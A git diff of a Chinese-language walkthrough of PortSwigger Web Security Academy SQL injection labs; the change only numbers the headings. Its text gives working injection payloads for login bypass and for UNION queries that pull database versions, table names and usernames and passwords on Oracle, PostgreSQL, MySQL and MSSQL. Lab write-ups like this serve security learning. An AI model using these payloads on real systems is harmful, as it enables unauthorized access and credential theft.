@@ -1,18 +1,18 @@
 # SQL injection
 
-## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+## 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
 > 最基础的SQL注入，由于题目中已经告诉了语句格式，即告诉了`category`字段为单引号闭合，实际测试中可能需要花费一定时间去判断*脆弱字段*和*闭合形式*。
 
 随便选择一个类别，然后修改类别名为不存在的名称，例如`abc`，然后进行单引号闭合，加入OR语句`or 1=1`，最后进行注释`--+`以使SQL语句成立，最后请求URL即为`https://xxxxxxx.web-security-academy.net/filter?category=abc'%20or%201%3D1--+`。
 
-## SQL injection vulnerability allowing login bypass
+## 2: SQL injection vulnerability allowing login bypass
 
 > 也是基础的SQL注入，题目要求登录`administrator`用户，那么用户名输入`administrator' --+`即可。实际中，可能需要测试一下闭合形式，我最开始是没有单引号的，发现失败了，就结合上一题（信息收集）测试一下单引号即可。
 
 点击`My Account`进入登陆界面，用户名输入`administrator' --+`，密码任意输入（防止有检测空密码的JavaScript代码阻止登录），最后请求包数据为`csrf=xxxxxxx&username=administrator%27%20--%2B&password=administrator`
 
-## SQL injection attack, querying the database type and version on Oracle
+## 3: SQL injection attack, querying the database type and version on Oracle
 
 > 基本的思路就是`union`一个查询数据库版本的语句，然后让其回显。
 
@@ -27,7 +27,7 @@
 通过资料可以发现，Oracle中查询版本的语句为`SELECT banner FROM v$version`和`SELECT version FROM v$instance
 `，我们以前者为例子，直接修改之前的select语句即可，例如`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version--+`，这里的`null`可以换成`%271%27`或直接`banner`。
 
-## SQL injection attack, querying the database type and version on MySQL and Microsoft
+## 4: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 > 与上一个一样，不过就是后端不一样，换一些语法就可以了。
 
@@ -35,7 +35,7 @@
 
 你也可以使用`version()`来替代`@@version`，这是我在下一个Lab中发现的，`version()`适用于所有非Oracle的数据库，但`@@version`仅适用于MySQL和Microsoft。
 
-## SQL injection attack, listing the database contents on non-Oracle databases
+## 5: SQL injection attack, listing the database contents on non-Oracle databases
 
 > 可以先通过注入查询数据库得到用户名密码，最后再登录。
 
@@ -47,13 +47,13 @@
 
 最后通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+usename,passwd+from+pg_user--+`，但是发现这里只有两个用户`peter`和`postgres`，所以我们表找错了。最后再查看一次所有表，觉得`users_alyjev`可能也较大，进行查询后得到用户名密码，登录即可。
 
-## SQL injection attack, listing the database contents on Oracle
+## 6: SQL injection attack, listing the database contents on Oracle
 
 > 思路与上一个Lab一样，不过后端是Oracle。
 
 通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+all_tables--+`查询所有表名，我们先选择`USERS_VSCHVE`这个表进行查询`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+all_tab_columns+where+table_name=%27USERS_VSCHVE%27--+`，然后查询用户名密码`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+USERNAME_LBWZOB,PASSWORD_JXBWPH+from+USERS_VSCHVE--+`，最后登录即可。
 
-## SQL injection UNION attack, determining the number of columns returned by the query
+## 7: SQL injection UNION attack, determining the number of columns returned by the query
 
 > 关键点在于通过`order by`判断有几列，然后根据题目要求添加一行空数据即可。
 
@@ -61,7 +61,7 @@
 
 `https://xxxxxxx.web-security-academy.net/filter?category=Pets%27union+select+null,null,null--+`
 
-## SQL injection UNION attack, finding a column containing text
+## 8: SQL injection UNION attack, finding a column containing text
 
 > 确定回显点为第二列之后，就可以在回显处完成输出`7ix1eZ`。
 
